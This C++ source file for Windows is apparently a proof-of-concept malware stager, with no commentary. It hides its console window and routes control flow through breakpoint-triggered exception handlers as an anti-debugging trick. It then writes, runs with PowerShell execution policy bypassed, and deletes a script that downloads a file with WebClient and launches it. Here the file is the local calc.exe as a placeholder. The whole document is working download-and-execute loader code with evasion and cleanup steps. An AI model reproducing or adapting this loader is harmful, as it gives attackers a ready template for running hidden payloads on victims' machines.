#include <iostream>
#include <fstream>
#include <windows.h>

void DwEx(void);

void RExecFlow2()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DwEx();
    }
}

void RExecFlow1()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        RExecFlow2();
    }
}

void DwEx(void)
{
    std::ofstream file;
    file.open("calc.ps1");
    std::string powershell;
    powershell += "$ob = New-Object System.Net.WebClient\n";
    powershell += "$lnk  = 'C:\\Windows\\System32\\calc.exe';";
    powershell += "$f1le = 'calc.exe';\n";
    powershell += "$ob.DownloadFile($lnk,$f1le); \n";
    powershell += "$exec = New-Object -com shell.application \n";
    powershell += "$exec.shellexecute($f1le);\n";
    file << powershell;
    file.close();
    system("powershell -ExecutionPolicy Bypass -F calc.ps1");
    file.close();
    remove("calc.ps1");
}

int wmain(void)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    {
        RExecFlow1();
    }
    __asm
    {
        xor eax, eax
    }
}